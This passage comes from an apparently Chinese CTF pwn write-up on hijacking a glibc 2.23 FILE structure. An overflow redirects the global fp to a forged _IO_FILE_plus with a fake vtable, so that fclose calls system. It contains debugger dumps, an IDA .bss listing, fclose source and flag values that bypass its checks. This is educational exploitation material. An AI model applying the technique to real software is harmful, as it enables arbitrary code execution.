<span class=\"type\">char</span> _unused2[<span class=\"number\">15</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">int</span>) - <span class=\"number\">4</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">void</span> *) - <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>)];</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">22</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72538984</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x804d570</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<h3 id=\"回归题目思路明确溢出修改fd的plus调用close时调用system\"><a class=\"markdownIt-Anchor\" href=\"#回归题目思路明确溢出修改fd的plus调用close时调用system\">#</a> 回归题目，思路明确，溢出修改 fd 的 plus，调用 close 时调用 system，</h3>\n<p>下面时 vtable 的一些内容</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy);</span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy2);</span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class=\"line\">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class=\"line\">    <span class=\"comment\">/* showmany */</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class=\"line\">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class=\"line\">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class=\"line\">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class=\"line\">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class=\"line\">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class=\"line\">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class=\"line\">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class=\"line\">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class=\"line\">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">    get_column;</span><br><span class=\"line\">    set_column;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>程序运行时的情况</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class=\"line\">$<span class=\"number\">28</span> = (<span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *) <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_jump_t *)<span class=\"number\">0xf7fb6ac0</span></span><br><span class=\"line\">$<span class=\"number\">27</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __finish = <span class=\"number\">0xf7e6d990</span> &lt;_IO_new_file_finish&gt;, </span><br><span class=\"line\">  __overflow = <span class=\"number\">0xf7e6e3b0</span> &lt;_IO_new_file_overflow&gt;, </span><br><span class=\"line\">  __underflow = <span class=\"number\">0xf7e6e150</span> &lt;_IO_new_file_underflow&gt;, </span><br><span class=\"line\">  __uflow = <span class=\"number\">0xf7e6f230</span> &lt;__GI__IO_default_uflow&gt;, </span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0xf7e700c0</span> &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class=\"line\">  __xsputn = <span class=\"number\">0xf7e6d600</span> &lt;_IO_new_file_xsputn&gt;, </span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0xf7e6d210</span> &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class=\"line\">  __seekoff = <span class=\"number\">0xf7e6c4b0</span> &lt;_IO_new_file_seekoff&gt;, </span><br><span class=\"line\">  __seekpos = <span class=\"number\">0xf7e6f4d0</span> &lt;_IO_default_seekpos&gt;, </span><br><span class=\"line\">  __setbuf = <span class=\"number\">0xf7e6c2f0</span> &lt;_IO_new_file_setbuf&gt;, </span><br><span class=\"line\">  __sync = <span class=\"number\">0xf7e6c1e0</span> &lt;_IO_new_file_sync&gt;, </span><br><span class=\"line\">  __doallocate = <span class=\"number\">0xf7e618d0</span> &lt;__GI__IO_file_doallocate&gt;, </span><br><span class=\"line\">  __read = <span class=\"number\">0xf7e6d5b0</span> &lt;__GI__IO_file_read&gt;, </span><br><span class=\"line\">  __write = <span class=\"number\">0xf7e6d060</span> &lt;_IO_new_file_write&gt;, </span><br><span class=\"line\">  __seek = <span class=\"number\">0xf7e6cda0</span> &lt;__GI__IO_file_seek&gt;, </span><br><span class=\"line\">  __close = <span class=\"number\">0xf7e6c2c0</span> &lt;__GI__IO_file_close&gt;, </span><br><span class=\"line\">  __stat = <span class=\"number\">0xf7e6d040</span> &lt;__GI__IO_file_stat&gt;, </span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0xf7e70250</span> &lt;_IO_default_showmanyc&gt;, </span><br><span class=\"line\">  __imbue = <span class=\"number\">0xf7e70260</span> &lt;_IO_default_imbue&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因为当前版本还是 2.23，可以直接修改虚表，但是为了方便还是修改修改 fd 里面的指针，指向一个伪造虚表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bss:<span class=\"number\">0804B</span>260 name            db <span class=\"number\">20</span>h <span class=\"title function_\">dup</span><span class=\"params\">(?)</span>           ; DATA XREF: main+<span class=\"number\">9F</span>↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>260                                         ; main+B4↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280                 public fp</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 ; FILE *fp</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class=\"number\">6</span>↑r</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 _bss            ends</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284 ; ===========================================================================</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284 ; Segment type: Zero-length</span><br><span class=\"line\">.prgend:<span class=\"number\">0804B</span>284 _prgend         segment byte public <span class=\"string\">&#x27;&#x27; use32</span></span><br><span class=\"line\"><span class=\"string\">.prgend:0804B284 _end            label byte</span></span><br><span class=\"line\"><span class=\"string\">.prgend:0804B284 _prgend         ends</span></span><br><span class=\"line\"><span class=\"string\">.prgend:0804B284</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; ===========================================================================</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; Segment type: Externs</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; extern</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288 ; char *strstr(const char *haystack, const char *needle)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288                 extrn strstr:near       ; CODE XREF: _strstr↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B288                                         ; DATA XREF: .got.plt:off_804B00C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B28C ; int printf(const char *format, ...)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B28C                 extrn printf:near       ; CODE XREF: _printf↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B28C                                         ; DATA XREF: .got.plt:off_804B010↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B290 ; int fclose(FILE *stream)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B290                 extrn fclose:near       ; CODE XREF: _fclose↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B290                                         ; DATA XREF: .got.plt:off_804B014↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B294 ; __sighandler_t signal(int sig, __sighandler_t handler)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B294                 extrn signal:near       ; CODE XREF: _signal↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B294                                         ; DATA XREF: .got.plt:off_804B018↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B298 ; unsigned int alarm(unsigned int seconds)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B298                 extrn alarm:near        ; CODE XREF: _alarm↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B298                                         ; DATA XREF: .got.plt:off_804B01C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B29C ; size_t fread(void *ptr, size_t size, size_t n, FILE *stream)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B29C                 extrn fread:near        ; CODE XREF: _fread↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B29C                                         ; DATA XREF: .got.plt:off_804B020↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A0 ; int puts(const char *s)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A0                 extrn puts:near         ; CODE XREF: _puts↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A0                                         ; DATA XREF: .got.plt:off_804B024↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A4 ; void exit(int status)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A4                 extrn exit:near         ; CODE XREF: _exit↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A4                                         ; DATA XREF: .got.plt:off_804B028↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A8 ; char *strchr(const char *s, int c)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A8                 extrn strchr:near       ; CODE XREF: _strchr↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2A8                                         ; DATA XREF: .got.plt:off_804B02C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC                 extrn __libc_start_main:near</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC                                         ; CODE XREF: ___libc_start_main↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2AC                                         ; DATA XREF: .got.plt:off_804B030↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B0 ; int setvbuf(FILE *stream, char *buf, int modes, size_t n)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B0                 extrn setvbuf:near      ; CODE XREF: _setvbuf↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B0                                         ; DATA XREF: .got.plt:off_804B034↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B4 ; FILE *fopen(const char *filename, const char *modes)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B4                 extrn fopen:near        ; CODE XREF: _fopen↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B4                                         ; DATA XREF: .got.plt:off_804B038↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B8 ; void *memset(void *s, int c, size_t n)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B8                 extrn memset:near       ; CODE XREF: _memset↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2B8                                         ; DATA XREF: .got.plt:off_804B03C↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2BC                 extrn __isoc99_scanf:near</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2BC                                         ; CODE XREF: ___isoc99_scanf↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2BC                                         ; DATA XREF: .got.plt:off_804B040↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C0 ; int atoi(const char *nptr)</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C0                 extrn atoi:near         ; CODE XREF: _atoi↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C0                                         ; DATA XREF: .got.plt:off_804B044↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                 extrn __imp___gmon_start__:near ; weak</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                                         ; CODE XREF: __gmon_start__↑j</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                                         ; DATA XREF: .got:__gmon_start___ptr↑o</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4</span></span><br><span class=\"line\"><span class=\"string\">extern:0804B2C4                 end _start</span></span><br></pre></td></tr></table></figure>\n<p>我们产看内存空间发现，在 fp 后有足够多的空间来放我们的 fake_file（虽然 filename 也很大，但是文件名只可以读取 63 字节）. 所以我们将 file 放在此处，同时伪造的时候要注意如何跳过 fclose 的一些检查：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class=\"line\">    _IO_un_link ((<span class=\"keyword\">struct</span> _IO_FILE_plus *) fp);</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_acquire_lock (fp);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class=\"line\">    status = _IO_file_close_it (fp);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class=\"number\">-1</span> : <span class=\"number\">0</span>;</span><br><span class=\"line\">  _IO_release_lock (fp);</span><br><span class=\"line\">  _IO_FINISH (fp);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//可以看到当_IO_IS_FILEBUF位为0时，函数不会执行_IO_un_link和_IO_file_close_it函数，而直接执行_IO_FINISH函数。在_IO_FINISH函数中会直接调用vtable中的__finish函数。其中_IO_IS_FILEBUF被定义为0x2000。_flags &amp; 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)；对于不同的函数，检查可能时不一样的，这就需要libc源码分析了。</span></span><br><span class=\"line\"><span class=\"comment\">//此外还有其他的绕过方法</span></span><br><span class=\"line\"><span class=\"comment\">//这里我并不清楚这些绕过都是什么，待后续学习</span></span><br><span class=\"line\"><span class=\"number\">1.</span>((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"comment\">//或者是</span></span><br><span class=\"line\"><span class=\"number\">2.</span></span><br><span class=\"line\">_IO_vtable_offset (fp) == <span class=\"number\">0</span> </span><br><span class=\"line\">&amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> </span><br><span class=\"line\">&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">   </span><br><span class=\"line\">flag&amp;<span class=\"number\">8</span> = <span class=\"number\">0</span> and flag &amp;<span class=\"number\">2</span> =<span class=\"number\">0</span> and flag &amp; <span class=\"number\">0x8000</span> != <span class=\"number\">0</span></span><br><span class=\"line\">所以flag的值可以为<span class=\"number\">0xfbad8000</span> 或者<span class=\"number\">0xfbad8080</span></span><br><span class=\"line\">  <span class=\"comment\">//unlink与io_FILE_plus 联合使用https://www.jianshu.com/p/1e45b785efc1</span></span><br></pre></td></tr></table></figure>\n<p>在执行 fclose 时会执行 unlink 等一些操作，同时会 free 我们开启的 fp 堆块以及储存数据的堆块，如果因为这两个堆块都比较大，检查是否与 topchunk 相邻，然年进行 free, 因为储存数据的堆块与 topchunk 相连，而且其在 file 堆块前释放，所以两个都会合并到 topchunk.fclose 会对 file_plus 的数据进处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72539124</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>继续我们上述的绕过检查，我们修改其的相关参数后释放</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 